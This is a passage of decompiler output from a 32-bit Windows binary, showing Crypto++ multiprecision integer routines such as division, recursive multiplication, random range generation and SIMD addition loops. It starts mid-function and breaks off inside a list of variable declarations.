  int v9; // ebx
  int v10; // eax
  int v11; // eax
  unsigned int v12; // esi
  _DWORD *Block; // [esp+1Ch] [ebp-4Ch]
  char pExceptionObject[40]; // [esp+30h] [ebp-38h] BYREF
  int v15; // [esp+64h] [ebp-4h]

  v4 = a3[3];
  if ( v4 )
  {
    v5 = (_DWORD *)(a3[4] + 4 * v4 - 4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = *(_DWORD *)(a4 + 12);
  if ( !v6 )
  {
LABEL_17:
    sub_43D290(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVDivideByZero_Integer_CryptoPP__);
  }
  v7 = (_DWORD *)(*(_DWORD *)(a4 + 16) + 4 * v6 - 4);
  while ( !*v7 )
  {
    --v7;
    if ( !--v6 )
      goto LABEL_17;
  }
  if ( v4 >= v6 )
  {
    v8 = v6 + (v6 & 1);
    v9 = v4 + (v4 & 1);
    v10 = sub_444C00(v8);
    sub_440E80((_DWORD *)(a1 + 4), v10);
    *(_DWORD *)(a1 + 20) = 0;
    v11 = sub_444C00(v9 - v8 + 2);
    sub_440E80(a2 + 1, v11);
    a2[5] = 0;
    v12 = v8 + 2 + v9 + 2 * (v8 + 2);
    Block = (_DWORD *)sub_41E7A0(v12, 0);
    v15 = 0;
    sub_441400(*(_DWORD **)(a1 + 16), a2[4], Block, (_DWORD *)a3[4], v9, *(char **)(a4 + 16), v8);
    v15 = 1;
    if ( v12 > 0x3FFFFFFF )
      v12 = 0x3FFFFFFF;
    memset(Block, 0, 4 * v12);
    if ( v12 )
      j_j_unknown_libname_61(Block);
    else
      j_j___free_base(Block);
  }
  else
  {
    sub_43DBB0((_DWORD *)a1, a3);
    *(_DWORD *)(a1 + 20) = 0;
    sub_43DBB0(a2, &dword_4EEE04);
  }
}
// 443F49: conditional instruction was optimized away because eax.4!=0
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4EEE04: using guessed type int dword_4EEE04;

//----- (00444070) --------------------------------------------------------
void __cdecl sub_444070(int a1, int a2, int a3)
{
  unsigned int v3; // eax
  _DWORD *v4; // ecx
  int v5; // ebx
  unsigned int v6; // eax
  _DWORD *v7; // ecx
  unsigned int v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // esi
  void *Block; // [esp+1Ch] [ebp-18h]
  unsigned int v12; // [esp+20h] [ebp-14h] BYREF
  int v13; // [esp+24h] [ebp-10h] BYREF
  int v14; // [esp+30h] [ebp-4h]

  v3 = *(_DWORD *)(a2 + 12);
  if ( v3 )
  {
    v4 = (_DWORD *)(*(_DWORD *)(a2 + 16) + 4 * v3 - 4);
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v3;
    }
    while ( v3 );
  }
  if ( v3 > 8 )
  {
    if ( v3 > 0x10 )
    {
      if ( v3 > 0x20 )
      {
        if ( v3 > 0x40 )
        {
          v13 = v3 - 1;
          v5 = 1 << sub_4327F0(&v13);
        }
        else
        {
          v5 = 64;
        }
      }
      else
      {
        v5 = 32;
      }
    }
    else
    {
      v5 = 16;
    }
  }
  else
  {
    v5 = dword_4BACF0[v3];
  }
  v13 = v5;
  v6 = *(_DWORD *)(a3 + 12);
  if ( v6 )
  {
    v7 = (_DWORD *)(*(_DWORD *)(a3 + 16) + 4 * v6 - 4);
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  if ( v6 > 8 )
  {
    if ( v6 > 0x10 )
    {
      if ( v6 > 0x20 )
      {
        if ( v6 > 0x40 )
        {
          v12 = v6 - 1;
          v8 = 1 << sub_4327F0(&v12);
        }
        else
        {
          v8 = 64;
        }
      }
      else
      {
        v8 = 32;
      }
    }
    else
    {
      v8 = 16;
    }
  }
  else
  {
    v8 = dword_4BACF0[v6];
  }
  v9 = v8 + v5;
  if ( v9 > 8 )
  {
    if ( v9 > 0x10 )
    {
      if ( v9 > 0x20 )
      {
        if ( v9 > 0x40 )
        {
          v12 = v9 - 1;
          v10 = 1 << sub_4327F0(&v12);
        }
        else
        {
          v10 = 64;
        }
      }
      else
      {
        v10 = 32;
      }
    }
    else
    {
      v10 = 16;
    }
  }
  else
  {
    v10 = dword_4BACF0[v9];
  }
  sub_440E80((_DWORD *)(a1 + 4), v10);
  *(_DWORD *)(a1 + 20) = 0;
  Block = (void *)sub_41E7A0(v9, 0);
  v14 = 0;
  sub_43EF80(*(_BYTE **)(a1 + 16), (int)Block, *(_DWORD *)(a2 + 16), v13, *(_DWORD *)(a3 + 16), v8);
  v14 = 1;
  if ( v9 > 0x3FFFFFFF )
    v9 = 0x3FFFFFFF;
  memset(Block, 0, 4 * v9);
  if ( v9 )
    j_j_unknown_libname_61(Block);
  else
    j_j___free_base(Block);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BACF0: using guessed type int dword_4BACF0[9];

//----- (00444260) --------------------------------------------------------
int __cdecl sub_444260(int a1, int a2, int a3)
{
  int v3; // edx
  int v4; // eax
  _DWORD *v5; // ecx
  unsigned int v6; // esi
  int v7; // ebp
  int v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // edi
  int v11; // eax
  unsigned int v12; // esi
  int v13; // edi
  int v14; // ecx
  void *v15; // edx
  int result; // eax
  int v17; // eax
  unsigned int v18; // edi
  int v19; // esi
  int v20; // ecx
  void *v21; // edx
  int v22; // [esp+18h] [ebp+8h]
  int v23; // [esp+1Ch] [ebp+Ch]

  v3 = *(_DWORD *)(a2 + 16);
  v4 = *(_DWORD *)(a2 + 12);
  if ( v4 )
  {
    v5 = (_DWORD *)(v3 + 4 * (v4 - 1));
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = v4 + (v4 & 1);
  v7 = *(_DWORD *)(a3 + 16);
  v8 = *(_DWORD *)(a3 + 12);
  if ( v8 )
  {
    v9 = (_DWORD *)(v7 + 4 * v8 - 4);
    do
    {
      if ( *v9 )
        break;
      --v9;
      --v8;
    }
    while ( v8 );
  }
  v10 = v8 + (v8 & 1);
  if ( v6 <= v10 )
  {
    if ( v6 == v10 )
    {
      if ( sub_440EF0(v3, v7, v6) < 0 )
      {
        off_4E8030(v7, *(_DWORD *)(a2 + 16));
        result = 1;
        *(_DWORD *)(a1 + 20) = 1;
      }
      else
      {
        off_4E8030(*(_DWORD *)(a2 + 16), v7);
        result = 0;
        *(_DWORD *)(a1 + 20) = 0;
      }
    }
    else
    {
      v17 = off_4E8030(v7, *(_DWORD *)(a2 + 16));
      v18 = v10 - v6;
      v19 = 4 * v6;
      v22 = v17;
      v20 = *(_DWORD *)(a1 + 16);
      v21 = (void *)(v19 + *(_DWORD *)(a3 + 16));
      if ( (void *)(v19 + v20) != v21 )
      {
        sub_438F30((void *)(v19 + v20), 4 * v18, v21, 4 * v18);
        v20 = *(_DWORD *)(a1 + 16);
        v17 = v22;
      }
      result = sub_441320((unsigned int *)(v19 + v20), v18, v17);
      *(_DWORD *)(a1 + 20) = 1;
    }
  }
  else
  {
    v11 = off_4E8030(v3, *(_DWORD *)(a3 + 16));
    v12 = v6 - v10;
    v13 = 4 * v10;
    v23 = v11;
    v14 = *(_DWORD *)(a1 + 16);
    v15 = (void *)(v13 + *(_DWORD *)(a2 + 16));
    if ( (void *)(v14 + v13) != v15 )
    {
      sub_438F30((void *)(v14 + v13), 4 * v12, v15, 4 * v12);
      v14 = *(_DWORD *)(a1 + 16);
      v11 = v23;
    }
    result = sub_441320((unsigned int *)(v13 + v14), v12, v11);
    *(_DWORD *)(a1 + 20) = 0;
  }
  return result;
}
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (004443D0) --------------------------------------------------------
int __cdecl sub_4443D0(int a1, unsigned int a2)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  char *v5; // eax
  int v6; // ecx
  int result; // eax
  _DWORD *v8; // edx
  unsigned int v9; // [esp+2Ch] [ebp+Ch]

  sub_43D360((_DWORD *)a1, 0, (a2 + 32) >> 5);
  v3 = sub_444C00((a2 + 32) >> 5);
  v4 = *(_DWORD *)(a1 + 12);
  v9 = v3;
  if ( v3 > v4 )
  {
    v5 = (char *)sub_43CD80(*(void **)(a1 + 16), v4, v3, 1);
    v6 = *(_DWORD *)(a1 + 12);
    *(_DWORD *)(a1 + 16) = v5;
    memset(&v5[4 * v6], 0, 4 * (v9 - v6));
    *(_DWORD *)(a1 + 12) = v9;
  }
  *(_DWORD *)(a1 + 8) = 0x3FFFFFFF;
  result = a1;
  v8 = (_DWORD *)(*(_DWORD *)(a1 + 16) + 4 * (a2 >> 5));
  *v8 |= 1 << (a2 & 0x1F);
  return result;
}

//----- (004444A0) --------------------------------------------------------
void __thiscall sub_4444A0(_DWORD *this, int *a2, _DWORD *a3, int a4)
{
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  unsigned int v8; // esi
  _DWORD *v9; // eax
  unsigned int v10; // esi
  unsigned int v11; // edx
  void *v12; // esi
  _DWORD v13[2]; // [esp+10h] [ebp-6Ch] BYREF
  unsigned int v14; // [esp+18h] [ebp-64h]
  unsigned int v15; // [esp+1Ch] [ebp-60h]
  void *Block; // [esp+20h] [ebp-5Ch]
  _DWORD *v17; // [esp+28h] [ebp-54h]
  char pExceptionObject[40]; // [esp+2Ch] [ebp-50h] BYREF
  _DWORD v19[6]; // [esp+54h] [ebp-28h] BYREF
  int v20; // [esp+78h] [ebp-4h]

  v5 = (int)a3;
  v17 = a3;
  v6 = *(_DWORD *)(a4 + 20);
  if ( a3[5] != 1 )
  {
    if ( v6 == 1 )
      goto LABEL_22;
    v7 = sub_443E50(a3, a4);
LABEL_6:
    if ( v7 <= 0 )
    {
      v5 = (int)v17;
      goto LABEL_8;
    }
LABEL_22:
    sub_419B80((int)v19, "Integer: Min must be no greater than Max");
    v20 = 0;
    sub_405230(pExceptionObject, v19);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( v6 == 1 )
  {
    v7 = -sub_443E50(a3, a4);
    goto LABEL_6;
  }
LABEL_8:
  sub_43DF90(v13, a4, v5);
  v8 = v15;
  v20 = 1;
  if ( !v15 )
    goto LABEL_12;
  v9 = (char *)Block + 4 * v15 - 4;
  while ( !*v9 )
  {
    --v9;
    if ( !--v8 )
      goto LABEL_12;
  }
  if ( v8 )
    v10 = sub_4327F0((_DWORD *)Block + v8 - 1) + 32 * v8 - 32;
  else
LABEL_12:
    v10 = 0;
  do
    sub_444600(this, a2, v10);
  while ( sub_43E1E0(this, (int)v13) );
  sub_43E3C0((int)this, (int)v17);
  v11 = v15;
  v12 = Block;
  if ( v14 < v15 )
    v11 = v14;
  v20 = 2;
  memset(Block, 0, 4 * v11);
  if ( v11 )
    j_j_unknown_libname_61(v12);
  else
    j_j___free_base(v12);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4444A0: using guessed type _DWORD var_6C[2];
// 4444A0: using guessed type _DWORD var_28[6];

//----- (00444600) --------------------------------------------------------
void __thiscall sub_444600(void *this, int *a2, unsigned int a3)
{
  int v3; // edx
  _BYTE *v4; // [esp+1Ch] [ebp-3Ch]
  int v6; // [esp+24h] [ebp-34h]
  _DWORD v7[8]; // [esp+28h] [ebp-30h] BYREF
  int v8; // [esp+54h] [ebp-4h]

  v6 = (a3 >> 3) + 1;
  v4 = sub_45AEA0(v6);
  v3 = *a2;
  v8 = 1;
  (*(void (__thiscall **)(int *, _BYTE *, int))(v3 + 36))(a2, v4, v6);
  *v4 &= (1 << (a3 & 7)) - 1;
  sub_43D9A0(v7, (int)v4, v6);
  sub_441170((int)this, (int)v7, v6, 0);
  v8 = 2;
  memset(v4, 0, v6);
  j_j___free_base(v4);
}
// 444600: using guessed type _DWORD var_30[8];

//----- (004446D0) --------------------------------------------------------
int __cdecl sub_4446D0(int a1, unsigned int *a2, _DWORD *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  int v5; // edi
  unsigned int v7; // esi
  int v8; // edx
  int *v9; // esi
  unsigned int v10; // ecx
  unsigned int i; // edx
  int v12; // ecx
  int v13; // ecx
  unsigned int v14; // ecx
  unsigned int j; // eax

  if ( a4 == 2 )
  {
    v7 = 3;
    v8 = *a3 & 7;
    do
    {
      v7 *= 2;
      v8 *= 2 - *a3 * v8;
    }
    while ( v7 < 0x20 );
    v9 = (int *)(a2 + 2);
    *a2 = v8;
    a2[1] = 0;
    dword_4EEE70(a2 + 2, a2, a3);
    v10 = a2[2];
    a2[2] = v10 - 1;
    if ( v10 - 1 > v10 )
    {
      for ( i = 1; i < 2; ++i )
      {
        v12 = v9[i];
        v9[i] = v12 - 1;
        if ( v12 )
          break;
      }
    }
    v13 = *v9;
    a2[3] = ~a2[3];
    v14 = ~v13;
    *v9 = v14 + 2;
    if ( v14 + 2 < v14 )
    {
      for ( j = 1; j < 2; ++j )
      {
        if ( v9[j]++ != -1 )
          break;
      }
    }
    return dword_4EEE70(a1, a2, v9);
  }
  else
  {
    v4 = a4 >> 1;
    sub_4446D0(a1, a2, a3, a4 >> 1);
    *a2 = 1;
    if ( a4 >> 1 != 1 )
      memset(a2 + 1, 0, 4 * ((a4 >> 1) - 1));
    v5 = a1 + 4 * v4;
    sub_4439C0(v5, (int)&a2[v4], (int)a2, a1, (int)a3, v4);
    sub_4449F0((int)a2, (int)&a2[v4], a1, (int)&a3[v4], v4);
    off_4E802C(v5, a2);
    sub_44E4E0(a2, v4);
    return sub_4449F0(v5, (int)&a2[v4], a1, (int)a2, v4);
  }
}
// 4EEE70: invalid function type 'int dword_4EEE70[]' has been ignored
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4EEE70: using guessed type int (__cdecl *dword_4EEE70)(_DWORD, _DWORD, _DWORD);

//----- (00444810) --------------------------------------------------------
unsigned int __cdecl sub_444810(int a1, int a2, int a3, int a4, unsigned int a5)
{
  unsigned int result; // eax
  unsigned int v6; // edi
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // edi
  int v10; // eax
  unsigned int v11; // ecx
  unsigned int v12; // esi
  unsigned int v13; // ebp
  unsigned int *v14; // esi
  unsigned int *v15; // edi
  int v16; // edx
  unsigned int v17; // ecx
  unsigned int v18; // eax
  int v19; // eax
  int v20; // eax
  bool v21; // zf
  unsigned int v22; // ecx
  int v23; // [esp+0h] [ebp-14h]
  int v24; // [esp+0h] [ebp-14h]
  int v25; // [esp+0h] [ebp-14h]
  int v26; // [esp+4h] [ebp-10h]
  int v27; // [esp+8h] [ebp-Ch]
  unsigned int v28; // [esp+Ch] [ebp-8h]
  unsigned int v29; // [esp+10h] [ebp-4h]

  if ( a5 <= dword_4E8034 )
    return ((int (__cdecl *)(int, int, int))dword_4EEE4C[a5 >> 2])(a1, a3, a4);
  v6 = a5 >> 1;
  v23 = a5 >> 1;
  v7 = sub_440EF0(a3, a3 + 4 * (a5 >> 1), a5 >> 1);
  v8 = a5 >> 1;
  if ( v7 > 0 )
    v8 = 0;
  v28 = v8;
  off_4E8030(a3 + 4 * v8, a3 + 4 * (v6 ^ v8));
  v9 = a4 + 4 * v6;
  v10 = sub_440EF0(a4, v9, v23);
  v11 = a5 >> 1;
  if ( v10 > 0 )
    v11 = 0;
  v29 = v11;
  v26 = a1 + 4 * v23;
  off_4E8030(a4 + 4 * v11, a4 + 4 * (v23 ^ v11));
  v12 = a2 + 4 * a5;
  sub_444810(a1 + 4 * a5, v12, a3 + 4 * (a5 >> 1), v9, v23);
  v13 = a5 >> 1;
  sub_444810(a2, v12, a1, v26, v23);
  sub_444810(a1, v12, a3, a4, v23);
  v14 = (unsigned int *)(a1 + 4 * a5);
  v24 = off_4E802C(v14, v26);
  v27 = off_4E802C(v14, a1) + v24;
  v15 = (unsigned int *)(a1 + 4 * (a5 + (a5 >> 1)));
  v25 = off_4E802C(v14, v15) + v24;
  if ( v28 == v29 )
    v16 = v25 - off_4E8030(v26, a2);
  else
    v16 = off_4E802C(v26, a2) + v25;
  v17 = *v14;
  v18 = *v14 + v27;
  *v14 = v18;
  if ( v18 < v17 )
  {
    v20 = 1;
    if ( v13 <= 1 )
    {
LABEL_15:
      v19 = 1;
      goto LABEL_16;
    }
    while ( 1 )
    {
      v21 = v14[v20]++ == -1;
      if ( !v21 )
        break;
      if ( ++v20 >= v13 )
        goto LABEL_15;
    }
  }
  v19 = 0;
LABEL_16:
  v22 = *v15;
  result = v16 + *v15 + v19;
  *v15 = result;
  if ( result < v22 )
  {
    for ( result = 1; result < v13; ++result )
    {
      v21 = v15[result]++ == -1;
      if ( !v21 )
        break;
    }
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);
// 4E8034: using guessed type int dword_4E8034;
// 4EEE4C: using guessed type int dword_4EEE4C[];

//----- (004449F0) --------------------------------------------------------
int __cdecl sub_4449F0(int a1, int a2, int a3, int a4, unsigned int a5)
{
  unsigned int v6; // edi
  unsigned int v7; // esi
  unsigned int v8; // [esp+18h] [ebp+14h]

  if ( a5 <= dword_4E8034 )
    return ((int (__cdecl *)(int, int, int))dword_4EEE70[a5 >> 2])(a1, a3, a4);
  v8 = a5 >> 1;
  sub_444810(a1, a2, a3, a4, v8);
  v6 = a2 + 4 * v8;
  sub_4449F0(a2, v6, a3 + 4 * v8, a4, v8);
  v7 = a1 + 4 * v8;
  off_4E802C(v7, a2);
  sub_4449F0(a2, v6, a3, a4 + 4 * v8, v8);
  return off_4E802C(v7, a2);
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8034: using guessed type int dword_4E8034;
// 4EEE70: using guessed type int dword_4EEE70[];

//----- (00444AA0) --------------------------------------------------------
unsigned int __cdecl sub_444AA0(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax
  int v5; // ebx
  int v6; // esi
  int v7; // edi
  int v8; // eax
  unsigned int v9; // edx
  unsigned int *v10; // esi
  unsigned int v11; // ecx

  if ( a4 <= dword_4E8034 )
    return ((int (__cdecl *)(int, int))dword_4EEE94[a4 >> 2])(a1, a3);
  v5 = a2 + 4 * a4;
  sub_444AA0(a1, v5, a3, a4 >> 1);
  v6 = a3 + 4 * (a4 >> 1);
  sub_444AA0(a1 + 4 * a4, v5, v6, a4 >> 1);
  sub_444810(a2, v5, a3, v6, a4 >> 1);
  v7 = off_4E802C(a1 + 4 * (a4 >> 1), a2);
  v8 = off_4E802C(a1 + 4 * (a4 >> 1), a2);
  v9 = a4 >> 1;
  v10 = (unsigned int *)(a1 + 4 * ((a4 >> 1) + a4));
  v11 = *v10;
  result = *v10 + v7 + v8;
  *v10 = result;
  if ( result < v11 )
  {
    for ( result = 1; result < v9; ++result )
    {
      if ( v10[result]++ != -1 )
        break;
    }
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8034: using guessed type int dword_4E8034;
// 4EEE94: using guessed type int dword_4EEE94[];

//----- (00444B80) --------------------------------------------------------
int __stdcall sub_444B80(int a1, int a2)
{
  return sub_43E460(a1, a2);
}

//----- (00444B90) --------------------------------------------------------
_DWORD *__thiscall sub_444B90(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edx

  v4 = this[6];
  if ( a2[3] == v4 && *(_DWORD *)(a3 + 12) == v4 )
  {
    if ( off_4E8030(a2[4], *(_DWORD *)(a3 + 16)) )
    {
      off_4E802C(a2[4], this[7]);
      return a2;
    }
  }
  else
  {
    sub_43E460((int)a2, a3);
    if ( a2[5] == 1 )
      sub_43E3C0((int)a2, (int)(this + 3));
  }
  return a2;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (00444C00) --------------------------------------------------------
int __cdecl sub_444C00(unsigned int a1)
{
  if ( a1 <= 8 )
    return dword_4BACF0[a1];
  if ( a1 <= 0x10 )
    return 16;
  if ( a1 <= 0x20 )
    return 32;
  if ( a1 <= 0x40 )
    return 64;
  --a1;
  return 1 << sub_4327F0(&a1);
}
// 4BACF0: using guessed type int dword_4BACF0[9];

//----- (00444C50) --------------------------------------------------------
int __fastcall sub_444C50(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v5; // edi
  int v6; // edx
  int v7; // ecx
  __m64 v8; // mm2
  __m64 v9; // mm2
  __m64 v10; // mm2
  __m64 v11; // mm2
  __m64 v12; // mm2
  int result; // eax

  v4 = a3 + 4 * a1;
  v5 = a4 + 4 * a1;
  v6 = a2 + 4 * a1;
  v7 = -a1;
  v8.m64_u64 = 0i64;
  if ( v7 )
  {
    if ( (v7 & 2) == 0 )
      goto LABEL_4;
    v7 -= 2;
    while ( 1 )
    {
      v11 = _mm_add_si64(
              v8,
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 8)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 8))));
      *(_DWORD *)(v6 + 4 * v7 + 8) = _mm_cvtsi64_si32(v11);
      v12 = _mm_add_si64(
              _m_psrlqi(v11, 0x20u),
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 12)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 12))));
      *(_DWORD *)(v6 + 4 * v7 + 12) = _mm_cvtsi64_si32(v12);
      v8 = _m_psrlqi(v12, 0x20u);
      v7 += 4;
      if ( !v7 )
        break;
LABEL_4:
      v9 = _mm_add_si64(
             v8,
             _mm_add_si64(_mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7)), _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7))));
      *(_DWORD *)(v6 + 4 * v7) = _mm_cvtsi64_si32(v9);
      v10 = _mm_add_si64(
              _m_psrlqi(v9, 0x20u),
              _mm_add_si64(
                _mm_cvtsi32_si64(*(_DWORD *)(v4 + 4 * v7 + 4)),
                _mm_cvtsi32_si64(*(_DWORD *)(v5 + 4 * v7 + 4))));
      *(_DWORD *)(v6 + 4 * v7 + 4) = _mm_cvtsi64_si32(v10);
      v8 = _m_psrlqi(v10, 0x20u);
    }
  }
  result = _mm_cvtsi64_si32(v8);
  _m_empty();
  return result;
}

//----- (00444CF0) --------------------------------------------------------
void __cdecl sub_444CF0(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  int v118; // ecx
  __m128i v119; // xmm6
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i *v122; // edx
  __m128i v123; // xmm7
  __m128i v124; // xmm0
  __m128i v125; // xmm7
  __m128i v126; // xmm6
  __m128i v127; // xmm4
  __m128i v128; // xmm5
  __m128i v129; // xmm6
  __m128i v130; // xmm7
  __m128i v131; // xmm0
  __m128i v132; // xmm1
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  int v135; // ecx
  __m128i v136; // xmm6
  __m128i v137; // xmm5
  __m128i v138; // xmm4
  __m128i v139; // xmm7
  __m128i v140; // xmm0
  __m128i *v141; // edx
  __m128i v142; // xmm7
  __m128i v143; // xmm6
  __m128i v144; // xmm4
  __m128i v145; // xmm5
  __m128i v146; // xmm6
  __m128i v147; // xmm7
  __m128i v148; // xmm0
  __m128i v149; // xmm1
  __m128i v150; // xmm4
  __m128i v151; // xmm5
  int v152; // ecx
  __m128i v153; // xmm6
  __m128i v154; // xmm5
  __m128i v155; // xmm4
  __m128i *v156; // edx
  __m128i v157; // xmm7
  __m128i v158; // xmm0
  __m128i v159; // xmm7
  __m128i v160; // xmm6
  __m128i v161; // xmm4
  __m128i v162; // xmm5
  __m128i v163; // xmm6
  __m128i v164; // xmm7
  __m128i v165; // xmm0
  __m128i v166; // xmm1
  __m128i v167; // xmm4
  __m128i v168; // xmm5
  int v169; // ecx
  __m128i v170; // xmm6
  __m128i v171; // xmm5
  __m128i v172; // xmm4
  __m128i v173; // xmm7
  __m128i v174; // xmm0
  __m128i *v175; // edx
  __m128i v176; // xmm7
  __m128i v177; // xmm6
  __m128i v178; // xmm4
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm7
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128i v184; // xmm4
  __m128i v185; // xmm5
  int v186; // ecx
  __m128i v187; // xmm6
  __m128i v188; // xmm5
  __m128i v189; // xmm4
  __m128i *v190; // edx
  __m128i v191; // xmm7
  __m128i v192; // xmm0
  __m128i v193; // xmm7
  __m128i v194; // xmm6
  __m128i v195; // xmm4
  __m128i v196; // xmm5
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm0
  __m128i v200; // xmm1
  __m128i v201; // xmm4
  __m128i v202; // xmm5
  int v203; // ecx
  __m128i v204; // xmm6
  __m128i v205; // xmm5
  __m128i v206; // xmm4
  __m128i v207; // xmm7
  __m128i v208; // xmm0
  __m128i *v209; // edx
  __m128i v210; // xmm7
  __m128i v211; // xmm6
  __m128i v212; // xmm4
  __m128i v213; // xmm5
  __m128i v214; // xmm6
  __m128i v215; // xmm7
  __m128i v216; // xmm0
  __m128i v217; // xmm1
  __m128i v218; // xmm4
  __m128i v219; // xmm5
  int v220; // ecx
  __m128i v221; // xmm6
  __m128i v222; // xmm5
  __m128i v223; // xmm4
  __m128i *v224; // edx
  __m128i v225; // xmm7
  __m128i v226; // xmm0
  __m128i v227; // xmm7
  __m128i v228; // xmm6
  __m128i v229; // xmm4
  __m128i v230; // xmm5
  __m128i v231; // xmm6
  __m128i v232; // xmm7
  __m128i v233; // xmm0
  __m128i v234; // xmm1
  __m128i v235; // xmm4
  __m128i v236; // xmm5
  int v237; // ecx
  __m128i v238; // xmm6
  __m128i v239; // xmm5
  __m128i v240; // xmm4
  __m128i v241; // xmm7
  __m128i v242; // xmm0
  __m128i *v243; // edx
  __m128i v244; // xmm7
  __m128i v245; // xmm6
  __m128i v246; // xmm2
  __m128i v247; // xmm5
  __m128i v248; // xmm6
  __m128i v249; // xmm7
  __m128i v250; // xmm0
  __m128i v251; // xmm1
  __m128i v252; // xmm4
  __m128i v253; // xmm5
  __m128i v254; // xmm6
  __m128i v255; // [esp+10h] [ebp-18Ch] BYREF
  __m128i v256; // [esp+20h] [ebp-17Ch] BYREF
  __m128i v257; // [esp+30h] [ebp-16Ch] BYREF
  __m128i v258; // [esp+40h] [ebp-15Ch] BYREF
  __m128i v259; // [esp+50h] [ebp-14Ch] BYREF
